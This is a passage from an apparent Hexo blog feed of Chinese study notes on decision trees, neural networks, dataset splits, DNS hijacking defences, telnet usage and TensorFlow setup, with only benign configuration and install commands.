定义属性的基尼指数</p><p><span class="math inline">\(Giniindex(D,a) =\sum{v=1}^{V}\frac{|D^v|}{|D|}Gini(D^v)\)</span></p><p>选择使划分后基尼指数最小的属性来划分</p><h2 id="剪枝处理">剪枝处理</h2><p>用于处理过拟合的情况，即去掉一些分支降低过拟合风险。</p><p>预剪枝：划分之前判断该次划分能否提升性能。</p><p>后剪枝：对于生成的决策树自底向上判断非叶节点能不能换为叶子节点。</p><p>预剪枝 每次划分之前，对于划分前后的泛化性能进行估计</p><p>使用正确率、假正率/假反率等在验证集上进行判断</p><p>精度不变、精度降低、内部样例已经为同一类时，不进行划分</p><p>后剪枝 对于已经得到的一颗决策树，自底向上考虑每一个非叶子节点。</p><p>如果使用节点取代子树后精度提高或者不变，则进行剪枝。</p><p>后剪枝得到的决策树更小但是训练成本高。</p><h2 id="连续与缺失值">连续与缺失值</h2><p>连续属性的处理 使用连续属性离散化技术</p><p>对于数据集中取值连续的 N个点，选择相邻两点的中位值作为作为候选划分点</p><p>通常可以将划分点选择为数据集中不高于中位点的最大值</p><p>注意使用连续值划分后，子树中仍然可使用同一连续属性</p><p>缺失值的处理 由于存在不完整样本，某些样本的某些属性值缺失</p><p>（1）如何选择划分属性（2）对于不完整样本如何在该属性下划分</p><p>首先选择在属性 a 下没有缺失值的样本子集 𝐷̃ 从而得到取值为 𝑎𝑣 的元素𝐷𝑣~ 定义一系列常数，并将原本的公式推广得到 𝐺𝑎𝑖𝑛(𝐷,𝑎)=𝜌×𝐺𝑎𝑖𝑛(𝐷̃,𝑎)=𝜌×(𝐸𝑛𝑡(𝐷̃ )−∑𝑟̃ 𝑣𝐸𝑛𝑡(𝐷𝑣~))、𝐸𝑛𝑡(𝐷̃ )=−∑𝑝̃ 𝑘𝑙𝑜𝑔2𝑝̃ 𝑘相当于将属性缺失的样本按不同概率划分到不同的子类中</p><h2 id="多变量决策树">多变量决策树</h2><p>每个属性看作一个坐标轴，d 个属性得到 d 维空间的一个数据点</p><p>分类任务是则为寻找坐标空间的分类边界</p><p>决策树学习得到的分类边界由若干个平行轴的分段组成</p><p>使用多变量决策树时，每个非叶节点是针对所有属性加权平均实现的线性分类器</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>ML 小知识</title>
      <link href="/blog/2021/07/15/ml/ml_skills/"/>
      <url>/blog/2021/07/15/ml/ml_skills/</url>
      
        <content type="html"><![CDATA[<h2 id="loss-reduction-when-to-use-sum-and-when-mean">Loss reduction:when to use sum and when mean？</h2><p>Loss reduction 一般使用 mean，原因是其实使用 sum 和 mean区别不大，使用 sum 就是对每次梯度进行累加，而使用 mean 就是累加之后除以batch size， 二者差一个 batch size 大小。而为了解耦合，避免调整 batchsize 的时候影响计算出来的梯度，从而影响事先调好的学习率，一般使用mean，这样即使调节 batch size，梯度大小也不会变化，最佳学习率也不会改变。</p><ol type="1"><li><ahref="https://stats.stackexchange.com/questions/453301/loss-reduction-when-to-use-sum-and-when-mean">neuralnetworks - Loss reduction: when to use sum and when mean? - CrossValidated</a></li><li><ahref="https://stats.stackexchange.com/questions/358786/mean-or-sum-of-gradients-for-weight-updates-in-sgd">neuralnetworks - Mean or sum of gradients for weight updates in SGD - CrossValidated</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>西瓜书第五章-神经网络</title>
      <link href="/blog/2021/07/15/ml/neural_network/"/>
      <url>/blog/2021/07/15/ml/neural_network/</url>
      
        <content type="html"><![CDATA[<h1 id="西瓜书第五章">西瓜书第五章</h1><h2 id="神经元模型">神经元模型</h2><p>M-P 神经元模型：n个其他单元的输入信号通过带权重的连接，总的输入值与阈值比较，通过激活函数处理产生输出。</p><p>常见的激活函数有阶跃函数和 Sigmoid 函数 11+𝑒−𝑥。</p><h2 id="感知机与多层网络">感知机与多层网络</h2><p>感知机为两层网络，一层输入一层输出。学习目标为权重和阈值，其中阈值的学习也可以转化为权重。</p><p>学习过程为 𝑤𝑖←𝑤𝑖+Δ𝑤𝑖，Δ𝑤𝑖=𝜂(𝑦−𝑦̂ )𝑥𝑖，其中 𝜂 为学习率。</p><p>可以证明线性可分的问题（可以使用线性超平面划分）使用感知机学习可以收敛。</p><p>解决线性不可分的问题要使用多层神经元，在输入和输出之间添加隐含层。</p><p>得到多层前馈神经网络，即不存在同层连接和跨层连接。</p><h2 id="误差逆传播算法">误差逆传播算法</h2><p>backpropagation 算法，用于训练多层前馈神经网络。</p><p>通常情况下，训练集中的输入数据和输出数据为多维向量（离散属性的处理）。</p><p>BP 是迭代学习算法，每一轮中使用广义感知机的学习规则 𝑣←𝑣+Δ𝑣更新参数。</p><p>使用梯度下降学习策略，以目标的负梯度方向调整参数，使用学习率调节步长。</p><p>输出值相对权值的梯度的计算根据链式法则由激活函数和每一层的输入值决定。</p><p>上述标准 BP 算法每次针对一个样例更新参数。</p><p>累计 BP算法读取一遍训练集（epoch）并得到累计误差，从而进行参数更新，更新频率比较低。</p><p>为了防止过拟合，可以采用两种策略</p><p>早停：训练集分出一部分验证集，训练集误差降低而验证集误差升高时停止训练。</p><p>正则化：目标函数中增加一个表示网络复杂度的成分，例如权值平方和得到𝐸=𝜆1𝑚∑𝐸𝑘+(1−𝜆)∑𝑤2𝑖。</p><h2 id="全局最小与局部极小">全局最小与局部极小</h2><p>误差目标函数可以看作参数值的函数。神经网络的训练过程为寻找最优的一组参数值。</p><p>存在全局最小值和局部极小值，后者表示邻域内的误差函数都大于该点。</p><p>梯度为 0的点可以是局部极小值点。基于梯度的搜索策略可能落入局部极小值点。</p><p>常见跳出局部最优值的方法有：</p><p>多组不同的参数初始化：从不同的初始值开始搜索。</p><p>模拟退火：参数更新时以一定的概率接受次优解（此概率逐渐减小）</p><p>随即梯度下降法</p><h2 id="其他常见神经网络">其他常见神经网络</h2><h3 id="rbf-网络">RBF 网络</h3><p>径向基函数网络，通常为单隐层网络，使用径向基函数作为激活函数。</p><p>高斯径向基函数 𝜌(𝑥,𝑐𝑖)=𝑒−𝛽𝑖||𝑥−𝑐𝑖||2。</p><h3 id="art-网络">ART 网络</h3><p>自适应谐振理论网络。使用竞争学习的思想进行无监督学习。</p><p>竞争学习中每一时刻仅有一个竞争获胜的神经元被激活，其他的被抑制。</p><p>识别层每个神经元记录一个模式类。计算输入向量与每个神经元的距离值，如果距离小于设定的阈值则激活某一个神经元并抑制其他的，同时更新参数。如果距离都大于阈值则将输入向量设置为新的一类。</p><p>ART 网络缓解了可塑性-稳定性窘境。可以增量学习和在线学习。</p><h3 id="som-网络">SOM 网络</h3><p>自组织(特征)映射网络。将高维数据映射到低维空间并保持数据点之间的拓扑关系。</p><p>输出层神经元按矩阵形式排列。</p><p>训练时根据输入选择激活的神经元，同时更新权值使临近神经元与当前样本距离减小。</p><h3 id="级联相关网络">级联相关网络</h3><p>属于一种结构自适应网络，网络结构也是学习目标之一。</p><p>初始情况只有输入和输出，训练过程中逐渐增加隐层单元，通过最大化新单元的输出和误差函数的相关性来训练参数。</p><h3 id="elman-网络">Elman 网络</h3><p>是最常用的递归神经网络之一，网络的输出不仅取决于当前输入还取决于上一时间步的输出。</p><p>隐层神经元的输出参与下一时刻的输入。</p><h3 id="boltzmann-机">Boltzmann 机</h3><p>基于能量的模型。</p><p>使用<span class="math inline">\(s_i\)</span> 表示单元的状态，<spanclass="math inline">\(w_{ij}\)</span> 表示权值，<spanclass="math inline">\(\theta_i\)</span>表示阈值。</p><p>定义能量 𝐸(𝑠)=−∑∑𝑤𝑖𝑗𝑠𝑖𝑠𝑗−∑𝜃𝑖𝑠𝑖。概率 𝑃(𝑠)=𝑒−𝐸(𝑠)∑𝑒−𝐸(𝑠)。</p><p>训练过程为将训练样本看作状态向量并使其概率尽可能大。</p><p>具体使用中常用受限 Boltzmann 机，并使用 CD 算法进行训练。</p><h3 id="深度学习">深度学习</h3><p>典型深度学习模型就是深层的神经网络，通过增加隐层的数量来增加模型复杂度。</p><p>多隐层的神经网络难以直接使用 BP算法训练，会出现不收敛的情况。主要有两种解决方法。</p><p>使用无监督逐层训练的方法，每次训练一层隐节点，称为预训练，全部完成后进行微调。</p><p>使用权共享的思路，让一组神经元使用相同的权。在卷积神经网络中有非常重要的作用。</p><p>（在 CNN中每个卷积层包含多个特征映射，每个池化层基于局部相关性原理进行压采样，其中每一组神经元都使用相同的连接权，减少参数数量。）</p><p>深度学习可以理解为特征学习或者表示学习。传统机器学习中通过人工设计样本特征，而特征学习通过机器学习技术自适应产生特征。</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>神经网络</title>
      <link href="/blog/2021/07/15/ml/neural_network2/"/>
      <url>/blog/2021/07/15/ml/neural_network2/</url>
      
        <content type="html"><![CDATA[<h1 id="神经网络">神经网络</h1><p>神经网络：人脑智慧的物质基础神经元/神经细胞：生物神经系统的基本单元</p><p>M-P 神经元模型 -1943 年</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154640537334.jpg"alt="m-p" /><figcaption aria-hidden="true">m-p</figcaption></figure><p>输入信号用来模拟神经元的树突，这些信号的来源不同，影响不同，因此为他们分配不同的权重。</p><p>计算单元模拟细胞核，将接收到的输入信号加权求和之后，与产生兴奋的中间结果相比较得到中间结果z。</p><p>最后，通过阶跃函数模拟神经兴奋。阶跃函数被称为激活函数/激励函数(activationfunctions)</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154641566100.jpg"alt="16154641566100" /><figcaption aria-hidden="true">16154641566100</figcaption></figure><p>权值向量 W 无法自动学习和更新,<strong>不具备学习的能力</strong></p><p>感知机模型 - 1957 年 感知机模型分为两层，输入层接受外界信号，输出层为M-P 神经元，忽略 MP 神经元的细节，可以简化为右下图形式。</p><p><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154645063032.jpg"alt="16154645063032" />输入层不发生计算，因此不计入神经网络的层数，只有输出层是发生计算的功能神经元，因此感知机是单层神经网络。</p><p>感知机训练法则： <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154646111140.jpg"alt="16154646111140" /></p><p>自动调整权值，具备学习能力 第一个用算法来精确定义的神经网络模型线性二分类的分类器感知机算法存在多个解，收到权值向量初始值，错误样本顺序的影响。对于非线性可分的数据集，感知机训练法，则无法收敛</p><p>Delta 法则使用<strong>梯度下降法</strong>，找到能够<strong>最佳拟合</strong>训练样本集的权向量。<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154654128122.jpg"alt="16154654128122" /></p><p>因为阶跃函数具有不连续，不光滑等不太好的性质，实际中，经常使用sigmod() 函数作为激活函数。 逻辑回归可以看做单层神经网络</p><p>多分类问题：设置多个输出节点，在输出层使用 soft max作为激活函数，得到不同种类的概率。 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154655651165.jpg"alt="16154655651165" /></p><h2 id="实现单层神经网络">实现单层神经网络</h2><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154682238736.jpg"alt="16154682238736" /><figcaption aria-hidden="true">16154682238736</figcaption></figure><p>神经网络的设计</p><ol type="1"><li>神经网络的结构确定有几层，每层有几个节点，节点之间时如何连接的，使用什么激活函数单层前馈型神经网络</li><li>激活函数 分类问题使用 softmax 函数作为激活函数 标签值使用 one-hotencoding 表示</li><li>损失函数 使用交叉熵损失函数来计算误差</li></ol><p>神经网络是数学模型，节点与节点之间的关系是数学运算，通过多维数组来实现这些数学运算。<imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16154686163797.jpg"alt="16154686163797" /></p><ol type="1"><li><p>softmax 函数 <code>tf.nn.softmax()</code>，<code>tf.nn.softmax(tf.matmul(X-train, W)+b)</code></p></li><li><p>one-hot encoding <code>tf.one_hot(indices, depth)</code>indices:输入值，要求是一个整数 depth：深度<code>tf.one_hot(tf.constant(y_test, dtype=tf.int32), 3)</code></p></li><li><p>交叉熵损失函数<code>tf.keras.losses.categorical_croossentropy(y_true, y_pred)</code>y_true: 表示为 one-hot encoding 的标签值 y_pred: 表示为 softmax函数的输出</p></li><li><p>平均交叉熵损失tf.reduce_mean(tf.keras.losses.categorical_crossentropy(y_true =T_train, y_pred=PRED_train))也可以使用求和函数得到总的交叉熵损失</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>训练集，验证集和测试集</title>
      <link href="/blog/2021/07/15/ml/train_test_eval_dataset/"/>
      <url>/blog/2021/07/15/ml/train_test_eval_dataset/</url>
      
        <content type="html"><![CDATA[<p>三种数据集的目的：</p><ul><li><p>训练集：主要目的是训练模型。</p></li><li><p>验证集：目的是为了验证不同的算法，检验哪种算法更有效。正确评估分类器的性能，选出合适的分类器。</p></li><li><p>测试集：测试集的目的是对最终所选定的神经网络系统做出无偏估计。</p><p>无偏估计：估计量的均值等于真实值，即具体每一次估计值可能大于真实值，也可能小于真实值，而不能总是大于或小于真实值（因为这就产生了系统误差）</p></li></ul><ol type="1"><li>在有验证集设置的情况下，你的模型可以从你对训练集的多次不同分割来反推出类似组合优化的次最优解，而你如果只使用训练集，你的调参之间的每次训练的目标都必然是当前先验约束下的局部最优解</li><li>训练集是用来 fit 你的 model 的；验证集是来 tune 你的 model的；测试集是来 deploy 你的 model 的。</li></ol><p>划分验证集与测试集，通过验证集进行训练，从而增加模型的泛化性能，</p><h2 id="验证集参与了超参数的训练">验证集参与了超参数的训练</h2><p>在训练模型时参数可以分为两种，一种是普通的模型参数，一种是需要人工调参的超参数，我们都知道普通参数的训练使用的是训练集的数据，验证集的数据并没有参与，因此可以用来进行评估。但实际上，我们在人工选择超参数，并使用验证集来决定最终使用哪组超参数的过程，也可以看作验证集参与了超参数的训练过程，因此我们还需要一个完全没有参与过所有参数训练的测试集来作为最终的结果评估。</p><p>当过拟合已经不是你的 main concern的时候就可以不分数据，各种大模型都是这样的，用的是百万至十亿级别的数据量</p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>DNS related notes</title>
      <link href="/blog/2021/07/15/network/dns_att_notes/"/>
      <url>/blog/2021/07/15/network/dns_att_notes/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.cloudxns.net/Support/detail/id/1839.html">浏览器DNS 缓存的清理——chrome 和 firefox</a> <ahref="https://www.cloudxns.net/Support/detail/id/2503.html">浅谈浏览器、操作系统DNS 缓存时间</a></p><p><a href="https://www.infoq.cn/article/8QmbXVaBN3EC8VT5itxW">浅析 DNS缓存技术及应用考虑</a></p><p><ahref="https://juejin.im/post/5cff858a6fb9a07ed84238ec#heading-9">你需要知道的“DNS劫持”--web 安全篇</a></p><h2 id="dns-劫持方法">DNS 劫持方法</h2><ol type="1"><li>本机 DNS 劫持</li><li>路由器劫持</li><li>运营商劫持</li><li>DNS 服务器被攻克</li></ol><p>解决方案：</p><p>用 HTTP DNS 代替 Local DNS</p><p>DoT（DNS over TCP）</p><p>DoH（DNS over HTTP）</p><p>https+DoH/DoT 可解</p><p>劫持常见两种：dns/http</p><p>dns 一般用 tcp 可以解决（解决污染是另一个话题），借助工具</p><p>http 的话两种方法</p><ol type="1"><li>经过一个可控 proxy，在 proxy 内过滤解决</li><li>禁止跳转，或者白名单，这种会出现刷新才能访问的情况，但频率很低</li></ol><h2 id="探测路由过程">探测路由过程</h2><p>windows 下的 baitracert 和 linux/BSD/router 下的 dutraceroute都用于探测数据包从源到目的经过路由的 IP，但两者探测的方法却有差别dao。</p><p>默认情况下，tracert 是向目的地址发出 ICMP 请求回显数据包，而traceroute 是向目的地址的某个端口（大于 30000）发送 UDP数据报。两者用于探测的数据类型不同。但他们也有一个共同点：都是通过设置发送包的TTL 的值从 1 开始、逐次增 1 的方法来探测。</p><h2 id="客户端操作系统-dns-控制">客户端、操作系统 DNS 控制</h2><p><a href="https://my.oschina.net/acmfly/blog/60560">邪恶的浏览器 DNS缓存</a></p><p>nscd - name service cache daemon</p><h2 id="其他">其他</h2><p>守护进程（daemon）是生存期长的一种进程，没有控制终端。它们常常在系统引导装入时启动，仅在系统关闭时才终止。UNIX系统有很多守护进程，守护进程程序的名称通常以字母“d”结尾：例如，syslogd就是指管理系统日志的守护进程。通过 ps 进程查看器 ps -efj的输出实例，内核守护进程的名字出现在方括号中</p><p>Linux 查看本地 DNS 服务器:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">cat</span> /etc/resolv.conf</span></span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Generated by NetworkManager</span></span><br><span class="line">nameserver 202.112.14.21</span><br><span class="line">nameserver 202.112.14.11</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> network </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>telnet 命令行使用</title>
      <link href="/blog/2021/07/15/network/telnet/"/>
      <url>/blog/2021/07/15/network/telnet/</url>
      
        <content type="html"><![CDATA[<h1 id="telnet">telnet</h1><p>telnet 远程终端访问，应用层协议， 默认端口号是 23。</p><h2 id="commandline-usage">commandline usage</h2><p>命令： <code>telnet &lt;address&gt; &lt;port&gt;</code> (port不写，默认为 telnet 的端口 23）</p><h3 id="远程登录">远程登录</h3><p><code>telnet &lt;address&gt; &lt;port&gt;</code></p><p>测试网站：</p><p><a href="https://www.telnetbbsguide.com/">telnet bbs</a> <ahref="http://telehack.com/">telehack</a> 该网站还有 <code>Eliza</code>人工智能对话机器人。</p><h3 id="telnet-获取网页">telnet 获取网页</h3><p>其实获取网页的话， curl 更好用。这里就是提一下，顺便简单练习一波 HTTP的格式。</p><ol type="1"><li><p>Telnet 到一个 Web 服务器<code>telnet telnet-online.net 80</code></p></li><li><p>键盘输入 GET 方法的 HTTP 请求消息</p><p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">Host: telnet-online.net</span><br></pre></td></tr></table></figure></p><p>键盘输入后,两次敲回车,你可以发送这个最小限度的 (但完整) GET方法的请求消息到 HTTP 服务器</p></li><li><p>观察 HTTP 服务器返回的响应消息</p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>CNN 中的卷积</title>
      <link href="/blog/2021/07/15/ml/cnn/cnn_notes/"/>
      <url>/blog/2021/07/15/ml/cnn/cnn_notes/</url>
      
        <content type="html"><![CDATA[<p>CNN 中的 2D 卷积实际上不是数学的卷积操作,是数学意义上的互相关操作.</p><p>Before we get into some theory, it is important to note that in CNNsalthough we call it a convolution, it is actually cross-correlation. Itis a technicality, but in a CNN we do not flip the filter as is requiredin typical convolutions. However except for this flip, both operationsare identical.</p><p><ahref="https://datascience.stackexchange.com/questions/40533/convolution-and-cross-correlation-in-cnn#:~:text=Before%20we%20get%20into%20some,flip%2C%20both%20operations%20are%20identical.">machinelearning - Convolution and Cross Correlation in CNN - Data Science StackExchange</a></p><p>Actually most practical applications of convolutional neural networks(CNN) use cross-correlation instead of convolutions.</p><p><ahref="https://www.quora.com/Why-do-CNNs-use-convolution-instead-of-cross-correlation">Whydo CNNs use convolution instead of cross-correlation? - Quora</a></p><p>多项式实际上是 1D 的离散卷积。</p><p>一维信号线性卷积可以认为是一种多项式相乘。已知两个信号卷积结果是已知序列降幂排列组成的幂函数多项式相乘得到的多项式结果的降幂序列值。这也就是为什么计算一维线性卷积有不进位乘法这种计算方法的原因。</p><h2 id="参考">参考</h2><p><ahref="https://www.zhihu.com/question/22298352">如何通俗易懂地解释卷积？- 知乎</a> <ahref="https://math.stackexchange.com/questions/1937630/convolution-and-multiplication-of-polynomials-is-the-same">calculus- Convolution and multiplication of polynomials is the same? -Mathematics Stack Exchange</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>从 PyTorch LeNet-5 看 CNN 相关编程</title>
      <link href="/blog/2021/07/15/programming/python/pytorch/torch_cnn/"/>
      <url>/blog/2021/07/15/programming/python/pytorch/torch_cnn/</url>
      
        <content type="html"><![CDATA[<ul class="task-list"><li><label><input type="checkbox" />TODO</label></li></ul><p><a href="https://blog.51cto.com/u_14481745/5622414">我用 PyTorch复现了 LeNet-5 神经网络（MNIST 手写数据集篇）！_51CTO 博客_lenet5卷积神经网络 pytorch</a></p><h2 id="nn-与-nn.functional-只有封装和灵活性的区别">nn 与 nn.functional只有封装和灵活性的区别</h2><p><a href="https://www.zhihu.com/question/66782101">PyTorch 中，nn 与nn.functional 有什么区别？ - 知乎</a></p><p>用在无 trainable parameter 的地方用 nn.functional <ahref="https://github.com/soapisnotfat/pytorch-cifar10/blob/master/models/LeNet.py">pytorch-cifar10/models/LeNet.pyat master · soapisnotfat/pytorch-cifar10</a></p><ul class="task-list"><li><label><input type="checkbox" /><ahref="https://zhuanlan.zhihu.com/p/38200980">深度学习中 Dropout 原理解析- 知乎</a></label></li><li><label><input type="checkbox" />cosine余弦退火等学习率调整策略</label></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CNN </tag>
            
            <tag> convolution </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TensorFlow 简介与环境配置</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_intro_config/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_intro_config/</url>
      
        <content type="html"><![CDATA[<h2 id="x-vs-2.x">1.x vs 2.x</h2><h3 id="执行机制">执行机制</h3><p>TensorFlow 1.x -- 延迟执行机制（deferred execution）</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151658449989.jpg"alt="16151658449989" /><figcaption aria-hidden="true">16151658449989</figcaption></figure><p>在计算图中只保存计算过程，并不实际计算，因此，称为延迟计算图/静态图，我们需要创建一个session，在其中进行计算。</p><p>特点：</p><ol type="1"><li>代码运行效率高，便于优化</li><li>静态图只需要创建一次，可以重复使用；静态图运行之前，可以优化，效率更高。</li><li>程序不够简洁</li></ol><p>Tensorflow 2.x -- 动态图机制（Eager execution）</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151667742943.jpg"alt="16151667742943" /><figcaption aria-hidden="true">16151667742943</figcaption></figure><ol type="1"><li>无需首先创建静态图，可以立刻执行计算，并返回结果</li><li>能够快速的建立和调试模型</li><li>执行效率不高</li></ol><p>可以在程序调试阶段使用动态图，快速建立模型、调试程序；在部署阶段，采用静态图机制，从而提高模型的性能和部署能力。</p><h3 id="api-整合">API 整合</h3><p>TensorFlow 1.x -- 重复、冗余的 API</p><ol type="1"><li>构建神经网络：tf.slim，tf.layers，tf.contrib.layers，tf.keras</li><li>混乱，不利于程序共享，维护的成本高</li></ol><p>TensorFlow 2.0 -- 清理/整合 API</p><ol type="1"><li>清理、整合了重复的 API</li><li>将 tf.keras 作为构建和训练模型的标准高级 API</li></ol><h3 id="在-2.x-中运行-1.x">在 2.x 中运行 1.x</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">import tensorflow.compat.v1 as tf</span><br><span class="line">tf.disable_v2_behavior()</span><br><span class="line">tf.compat.v1.disable_eager_execution()</span><br></pre></td></tr></table></figure><h2 id="tensorflow-环境配置">TensorFlow 环境配置</h2><h3 id="包管理与环境管理">包管理与环境管理</h3><p>conda 包命令 安装包: conda install <package_name> 卸载包: condaremove <package_name> 更新包：conda update <package_names>模糊查询：conda search <text></p><p>通常使用 conda 进行包管理，如果遇到 conda 不能管理，可以使用 pip</p><h3 id="conda-环境管理">conda 环境管理</h3><p>conda create --name <env_name><package_names> conda activate<env_name> deactivate conda remove --name <env_name> --all conda envlist</p><p>配置 anaconda 清华大学镜像 参考：<ahref="https://mirrors.tuna.tsinghua.edu.cn/help/anaconda/">Anaconda镜像使用帮助</a></p><h3 id="tensorflow-2.0-安装">tensorflow 2.0 安装</h3><ol type="1"><li><p>创建独立环境，并激活</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda create --name rltest python==3.7</span><br><span class="line">conda activate rltest</span><br></pre></td></tr></table></figure></p></li><li><p>安装相关软件包</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conda install numpy matplotlib PIL scikit-learn pandas</span><br><span class="line">pip install numpy matplotlib Pillow scikit-learn pandas -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></p></li><li><p>安装 tensorflow2.0</p><p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install tensorflow==2.0.0-beta -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure></p><p>由于 tensorflow 版本与 numpy 版本的兼容问题，出现了 Futurewaring，因此我重新安装了 <code>pip install "numpy&lt;1.17"</code>,安装了numpy 1.16.6 版本</p></li></ol><h2 id="参考">参考</h2><ol type="1"><li><p><ahref="https://github.com/tensorflow/tensorflow/issues/30427">FutureWarning:Deprecated numpy API calls in tf.python.framework.dtypes</a></p></li><li><p><ahref="https://stackoverflow.com/questions/57381430/synonym-of-type-is-deprecated-in-a-future-version-of-numpy-it-will-be-underst">“synonymof type is deprecated; in a future version of numpy, it will beunderstood as (type, (1,)) / '(1,)type'.” problem inTensorFlow</a></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tensorflow common issues</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_issues/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_issues/</url>
      
        <content type="html"><![CDATA[<h2 id="tensorflow-使用-gpu">tensorflow 使用 gpu</h2><p><a href="media/16152713702364/use_gpu.pdf">tf gpu tutorial</a></p><h2id="运行-tensorflow-终端输出omp-info-172-kmp_affinity-os-proc-126-maps-to-socket-1-core-30-thread-1">运行Tensorflow 终端输出：OMP: Info #172: KMP_AFFINITY: OS proc 126 maps tosocket 1 core 30 thread 1</h2><p>结论：它只是正常输出一些 OpenMP debugmessages，可以通过下面命令抑制输出：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">os.environ[&quot;KMP_WARNINGS&quot;] = &quot;FALSE&quot;</span><br></pre></td></tr></table></figure><p><ahref="https://stackoverflow.com/questions/57573338/weird-output-when-using-tensorflow-backend-on-keras-omp-info-xx-kmp-affinity">python- Weird output when using TensorFlow backend on Keras (OMP: Info #xxKMP_AFFINITY) - Stack Overflow</a></p>]]></content>
      
      
      <categories>
          
          <category> ml </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>tensorflow 张量</title>
      <link href="/blog/2021/07/15/programming/python/tensorflow/tf_tensor/"/>
      <url>/blog/2021/07/15/programming/python/tensorflow/tf_tensor/</url>
      
        <content type="html"><![CDATA[<h2 id="张量列表和-ndarray">张量、列表和 ndarray</h2><p>tensorflow 中的 “Tensor” 表示张量，其实就是多维数组。</p><ul><li>Python 中的列表 list</li><li>NumPy 中的数组对象 ndarray 它们也都可以作为数据的载体</li></ul><p>Python 列表(list)</p><ol type="1"><li>元素可以使用不同的数据类型，可以嵌套</li><li>在内存中不连续存放，是一个动态的指针数组</li><li>读写效率低，占用内存空间大,不适合做数值计算</li></ol><p>numpy 数组(array)</p><ol type="1"><li>元素数据类型相同</li><li>每个元素在内存中占用的空间相同，存储在一个连续的内存区域中</li><li>存储空间小，读取和写入速度快在 CPU 中运算，不能够主动检测、利用 GPU进行运算</li></ol><p>tensorflow 张量(tensor) 可以高速运行于 GPU 和 TPU 之上 支持CPU、嵌入式、单机多卡和多机多卡等多种计算环境高速的实现神经网络和深度学习中的复杂算法。</p><p>TensorFlow 的基本运算、参数命名、运算规则、API 的设计等与 NumPy非常相近</p><h2 id="创建张量">创建张量</h2><p>张量由 Tensor 类实现，每一个张量都是一个 Tensor 对象</p><h3 id="tf.constant-函数创建张量">tf.constant() 函数：创建张量</h3><p><code>tf.constant(value, dtype, shape)</code></p><p>value：数字/Python 列表/NumPy 数组，最终在 tensor 中被存储为 numpy数组 dtype：元素的数据类型 shape：张量的形状</p><p>参数为小数时，默认为 float32 <imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151704903924.jpg"alt="16151704903924" /></p><p>张量.numpy() 方法得到对应数组</p><figure><imgsrc="https://blog-1259556217.cos.ap-chengdu.myqcloud.com/image/16151713130378.jpg"alt="16151713130378" /><figcaption aria-hidden="true">16151713130378</figcaption></figure><p>参数为 numpy 数组 numpy 创建浮点数数组时，默认的浮点型是 64位浮点数。 当使用 NumPy 数组创建张量时，TensorFlow会接受数组元素的数据类型，使用 64 位浮点数保存数据。 GPU 处理 32位浮点数快，而且大部分情况下 32 位的京都已经足够了，因此使用 numpy数组创建时，一般指定 